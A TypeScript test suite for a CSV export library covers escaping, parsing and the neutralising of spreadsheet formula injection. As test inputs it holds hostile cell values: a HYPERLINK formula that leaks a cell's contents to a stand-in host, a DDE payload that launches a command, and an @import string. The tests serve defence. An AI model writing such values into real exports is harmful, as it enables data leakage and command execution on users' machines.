/**
 * Shared CSV writer (lib/csv.ts): proper escaping, formula-injection neutralising, and an exact inverse so a signed
 * export can still be verified from the values that were written.
 */
import { csvCell, csvLine, toCsv, csvUnneutralize, parseCsv, looksLikeFormula } from "@/lib/csv";

describe("csvCell: escaping", () => {
  it("leaves plain values alone", () => {
    expect(csvCell("hello")).toBe("hello");
    expect(csvCell("src/app/page.tsx")).toBe("src/app/page.tsx");
    expect(csvCell("2026-11-26T10:00:00.000Z")).toBe("2026-11-26T10:00:00.000Z");
  });
  it("quotes a value with a comma, quote or line break, doubling inner quotes", () => {
    expect(csvCell("a,b")).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("line1\nline2")).toBe('"line1\nline2"');
    expect(csvCell("line1\r\nline2")).toBe('"line1\r\nline2"');
  });
  it("writes null, undefined and non-finite numbers as empty", () => {
    for (const v of [null, undefined, NaN, Infinity]) expect(csvCell(v)).toBe("");
  });
  it("writes numbers, booleans, bigints and dates as themselves", () => {
    expect(csvCell(42)).toBe("42");
    expect(csvCell(-5)).toBe("-5");            // a real number is not a formula
    expect(csvCell(0)).toBe("0");
    expect(csvCell(3.14)).toBe("3.14");
    expect(csvCell(true)).toBe("true");
    expect(csvCell(10n)).toBe("10");
    expect(csvCell(new Date("2026-11-26T10:00:00Z"))).toBe("2026-11-26T10:00:00.000Z");
  });
  it("writes objects as JSON text", () => {
    expect(csvCell({ a: 1 })).toBe('"{""a"":1}"');
  });
});

describe("csvCell: formula injection", () => {
  it.each([
    ["=1+1"], ["+1+1"], ["-1+1"], ["@SUM(A1:A9)"], ["\t=1+1"], ["\r=1+1"], [" =1+1"], ["  \t+cmd"],
    ['=HYPERLINK("https://evil.example/?q="&A1,"click")'], ["=cmd|' /C calc'!A0"], ["@import url(//evil)"],
  ])("neutralises %j with a leading apostrophe", (s) => {
    expect(looksLikeFormula(s)).toBe(true);
    const cell = csvCell(s);
    const raw = parseCsv(cell)[0][0];
    expect(raw.startsWith("'")).toBe(true);
    expect(raw.slice(1)).toBe(s);
  });

  it("no cell that reaches the file can begin with a formula character", () => {
    const hostile = ["=A1", "+A1", "-A1", "@A1", "\tA1", "\rA1", "'=A1", "' =A1", "=a,b", '="x"', "-", "+", "=", "@"];
    for (const s of hostile) {
      const raw = parseCsv(csvLine([s]))[0][0];
      expect(/^[=+\-@\t\r]/.test(raw)).toBe(false);
    }
  });

  it("leaves harmless text that merely contains those characters", () => {
    for (const s of ["a=b", "x+y", "a-b", "user@example.com", "1 - 2", "end-"]) expect(csvCell(s)).toBe(s);
  });

  it("a numeric-looking STRING is treated as text (neutralised), a real number is not", () => {
    expect(csvCell("-5")).toBe("'-5");
    expect(csvCell(-5)).toBe("-5");
  });
});

describe("neutralising is exactly reversible", () => {
  const samples = [
    "plain", "", "=1+1", "+x", "-x", "@x", "\t=x", " =x", "'", "'abc", "'=x", "''=x", "a,b", 'q"q', "multi\nline", "=a,\"b\"\n=c",
    "é中文", "user@example.com", "'@home", "tab\there", "-", "--", "=",
  ];
  it.each(samples.map(s => [JSON.stringify(s), s]))("round-trips %s", (_label, s) => {
    // a neighbouring cell, because a one-column record holding an empty value is just an empty line, as in any CSV
    const back = csvUnneutralize(parseCsv(csvLine(["x", s]))[0][1]);
    expect(back).toBe(s);
  });

  it("round-trips arbitrary strings (randomised)", () => {
    let seed = 12345;
    const rnd = () => (seed = (seed * 1103515245 + 12345) & 0x7fffffff) / 0x7fffffff;
    const alphabet = ["=", "+", "-", "@", "'", '"', ",", "\n", "\r", "\t", " ", "a", "b", "1", "é"];
    for (let i = 0; i < 400; i++) {
      const s = Array.from({ length: Math.floor(rnd() * 8) }, () => alphabet[Math.floor(rnd() * alphabet.length)]).join("");
      const cells = [s, "x", s];
      const parsed = parseCsv(csvLine(cells))[0].map(csvUnneutralize);
      expect(parsed).toEqual(cells);
    }
  });

  it("an apostrophe that was already there is not lost", () => {
    expect(csvUnneutralize(parseCsv(csvLine(["'hello"]))[0][0])).toBe("'hello");
  });
});

describe("toCsv and parseCsv", () => {
  it("joins header and rows", () => {
    expect(toCsv(["a", "b"], [[1, "x,y"], [2, "=z"]])).toBe(`a,b\n1,"x,y"\n2,'=z`);
    expect(toCsv(["a"], [[1]], "\r\n")).toBe("a\r\n1");
  });
  it("parses quoted cells, doubled quotes, embedded line breaks and either line ending", () => {
    expect(parseCsv('a,"b,c","d ""e"" f"\n"x\ny",2')).toEqual([["a", "b,c", 'd "e" f'], ["x\ny", "2"]]);
    expect(parseCsv("a,b\r\nc,d\r\n")).toEqual([["a", "b"], ["c", "d"]]);
  });
  it("keeps empty cells and ignores a final line break", () => {
    expect(parseCsv("a,,c\n")).toEqual([["a", "", "c"]]);
    expect(parseCsv(",\n")).toEqual([["", ""]]);
    expect(parseCsv("")).toEqual([]);
  });
});
